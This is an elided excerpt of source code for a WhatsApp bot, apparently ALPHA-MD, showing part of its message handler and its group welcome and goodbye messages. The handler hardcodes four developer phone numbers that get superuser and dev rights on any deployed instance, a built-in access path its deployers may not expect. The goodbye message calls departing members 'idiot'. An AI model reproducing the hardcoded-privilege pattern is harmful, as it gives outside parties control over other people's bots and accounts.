...
setTimeout(() => {
    async function main() {
        ...
        zk.ev.on("messages.upsert", async (m) => {
            ...
            /* const keithkeizzah1='254757835036';
             const keithkeizzah2='254751284190';
             const keithkeizzah3='254750948696'*/
            /*  var superUser=[servBot,keithkeizzah1,keithkeizzah2,keithkeizzah3].map((s)=>s.replace(/[^0-9]/g)+"@s.whatsapp.net").includes(auteurMessage);
              var dev =[keithkeizzah1,keithkeizzah2,keithkeizzah3].map((t)=>t.replace(/[^0-9]/g)+"@s.whatsapp.net").includes(auteurMessage);*/
            ...
            const keithkeizzah = '25479629919';
            const keithkeizzah1 = '254748387615';
            const keithkeizzah2 = "254110190196";
            const keithkeizzah3 = '254752925938';
            const sudo = await getAllSudoNumbers();
            const superUserNumbers = [servBot, keithkeizzah, keithkeizzah1, keithkeizzah2, keithkeizzah3, conf.NUMERO_OWNER].map((s) => s.replace(/[^0-9]/g) + "@s.whatsapp.net");
            const allAllowedNumbers = superUserNumbers.concat(sudo);
            const superUser = allAllowedNumbers.includes(auteurMessage);
            
            var dev = [keithkeizzah, keithkeizzah1,keithkeizzah2,keithkeizzah3].map((t) => t.replace(/[^0-9]/g) + "@s.whatsapp.net").includes(auteurMessage);
...
`;
            ...
            msg += `║ *Thanks for joining us just make sure you read the group rules to avoid being removed*
...
${metadata.desc}
*Join our support channel for This bot updates*
https://whatsapp.com/channel/0029Vaan9TF9Bb62l8wpoD47`;

            zk.sendMessage(group.id, { image: { url: ppgroup }, caption: msg, mentions: membres });
        } else if (group.action == 'remove' && (await recupevents(group.id, "goodbye") == 'on')) {
            let msg = `Another idiot has just left the group.Anyway we will miss you very much comrade🤝 powered by *ALPHA-MD* 
